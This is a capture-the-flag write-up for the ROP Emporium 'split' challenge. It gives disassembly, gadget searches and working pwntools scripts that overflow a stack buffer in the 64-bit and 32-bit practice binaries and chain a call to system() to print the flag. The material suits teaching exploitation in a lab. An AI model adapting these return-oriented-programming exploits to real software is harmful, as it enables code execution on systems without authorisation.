## 64 bits

Executing the program

```bash
$ ./split 
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> test
Thank you!

Exiting

```

<br/>

I'll use radare2 to see the functions

```bash
[0x004005b0]> afl
0x004005b0    1 42           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   entry.fini0
0x00400690    1 7            entry.init0
0x004006e8    1 90           sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400742    1 17           sym.usefulFunction
0x00400560    1 6            sym.imp.system
0x004007d0    1 2            sym.__libc_csu_fini
0x004007d4    1 9            sym._fini
0x00400760    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
```

Now i'll open it on gdb to see the assembly of the functions

<br/>

main:

```bash
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:     push   rbp
   0x0000000000400698 <+1>:     mov    rbp,rsp
   0x000000000040069b <+4>:     mov    rax,QWORD PTR [rip+0x2009d6]        # 0x601078 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:    mov    ecx,0x0
   0x00000000004006a7 <+16>:    mov    edx,0x2
   0x00000000004006ac <+21>:    mov    esi,0x0
   0x00000000004006b1 <+26>:    mov    rdi,rax
   0x00000000004006b4 <+29>:    call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:    mov    edi,0x4007e8
   0x00000000004006be <+39>:    call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:    mov    edi,0x4007fe
   0x00000000004006c8 <+49>:    call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:    mov    eax,0x0
   0x00000000004006d2 <+59>:    call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:    mov    edi,0x400806
   0x00000000004006dc <+69>:    call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:    mov    eax,0x0
   0x00000000004006e6 <+79>:    pop    rbp
   0x00000000004006e7 <+80>:    ret    
End of assembler dump.
```

<br/>

pwnme:

```bash
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x20
   0x00000000004006f0 <+8>:     lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:    mov    edx,0x20
   0x00000000004006f9 <+17>:    mov    esi,0x0
   0x00000000004006fe <+22>:    mov    rdi,rax
   0x0000000000400701 <+25>:    call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:    mov    edi,0x400810
   0x000000000040070b <+35>:    call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:    mov    edi,0x40083c
   0x0000000000400715 <+45>:    mov    eax,0x0
   0x000000000040071a <+50>:    call   0x400570 <printf@plt>
   0x000000000040071f <+55>:    lea    rax,[rbp-0x20]
   0x0000000000400723 <+59>:    mov    edx,0x60
   0x0000000000400728 <+64>:    mov    rsi,rax
   0x000000000040072b <+67>:    mov    edi,0x0
   0x0000000000400730 <+72>:    call   0x400590 <read@plt>
   0x0000000000400735 <+77>:    mov    edi,0x40083f
   0x000000000040073a <+82>:    call   0x400550 <puts@plt>
   0x000000000040073f <+87>:    nop
   0x0000000000400740 <+88>:    leave  
   0x0000000000400741 <+89>:    ret    
End of assembler dump.
```

<br/>

usefulFunction:

```bash
gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret    
End of assembler dump.
gef➤  x/s 0x40084a
0x40084a:       "/bin/ls"
```

The way to get the offset is the same as ret2win, it's 40

<br/>

In this case in the usefulFunction there isn't /bin/cat flag.txt, but if we use radare2 and use the command iz:

```bash
[0x004005b0]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

<br/>

Now you have to find a ROP gadget to pop the rdi value and put there /bin/cat flag.txt, to do this there are different tools, I'll use ropper

```bash
$ ropper -f split | grep rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x00000000004006d4: add byte ptr [rax], al; add byte ptr [rdi + 0x400806], bh; call 0x550; mov eax, 0; pop rbp; ret; 
0x00000000004006d6: add byte ptr [rdi + 0x400806], bh; call 0x550; mov eax, 0; pop rbp; ret; 
0x00000000004007c3: pop rdi; ret;
```

The one you'll need it's the pop rdi; ret;, now you have everything to make the exploit, the exploit will be padding + usefulFunction address + /bin/cat flag.txt address + pop rdi gadget + system address

<br/>

(The system address is in the usefulFunction, see above in the assembly of it)

<br/>

```python
from pwn import *

p = process("./split")

padding = b'a'*40
usefulfun_addr = p64(0x0000000000400742)
cat_flag = p64(0x00601060)
pop_rdi = p64(0x00000000004007c3)
system_addr = p64(0x0040074b)


payload = padding
payload += pop_rdi
payload += cat_flag
payload += system_addr

p.sendline(payload)
p.interactive()
```

<br/>

## 32 bits

Executing the binary

```bash
$ ./split32 
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> test
Thank you!

Exiting
```

<br/>

List of the functions

```bash
[0x08048430]> afl
0x08048430    1 50           entry0
0x08048463    1 4            fcn.08048463
0x080483f0    1 6            sym.imp.__libc_start_main
0x08048490    4 50   -> 41   sym.deregister_tm_clones
0x080484d0    4 58   -> 54   sym.register_tm_clones
0x08048510    3 34   -> 31   entry.fini0
0x08048540    1 6            entry.init0
0x080485ad    1 95           sym.pwnme
0x08048410    1 6            sym.imp.memset
0x080483d0    1 6            sym.imp.puts
0x080483c0    1 6            sym.imp.printf
0x080483b0    1 6            sym.imp.read
0x0804860c    1 25           sym.usefulFunction
0x080483e0    1 6            sym.imp.system
0x08048690    1 2            sym.__libc_csu_fini
0x08048480    1 4            sym.__x86.get_pc_thunk.bx
0x08048694    1 20           sym._fini
0x08048630    4 93           sym.__libc_csu_init
0x08048470    1 2            sym._dl_relocate_static_pie
0x08048546    1 103          main
0x08048400    1 6            sym.imp.setvbuf
0x08048374    3 35           sym._init
```

<br/>

Now i'll use gdb to see the usefulFunction (main and pwnme are the same as ret2win and the offset is the same)

<br/>

usefulFunction:

```bash
gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804860c <+0>:     push   ebp
   0x0804860d <+1>:     mov    ebp,esp
   0x0804860f <+3>:     sub    esp,0x8
   0x08048612 <+6>:     sub    esp,0xc
   0x08048615 <+9>:     push   0x804870e
   0x0804861a <+14>:    call   0x80483e0 <system@plt>
   0x0804861f <+19>:    add    esp,0x10
   0x08048622 <+22>:    nop
   0x08048623 <+23>:    leave  
   0x08048624 <+24>:    ret    
End of assembler dump.
gef➤  x/s 0x804870e
0x804870e:      "/bin/ls"
```

Now there isn't the /bin/cat flag.txt, but if you use radare2 and run the command iz:

```bash
[0x08048430]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium
1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n
2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting
3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt
```

<br/>

Now find the address of system@plt

```bash
gef➤  print 'system@plt'
$1 = {<text variable, no debug info>} 0x80483e0 <system@plt>
```

<br/>

The exploit is going to be padding + system address + /bin/cat flag.txt address

```python
from pwn import *

p = process("./split32")

pad = b'a'*44
cat_flag = p32(0x0804a030)
sys_addr = p32(0x0804861a)

payload = pad + sys_addr + cat_flag

p.sendline(payload)
p.interactive()
```
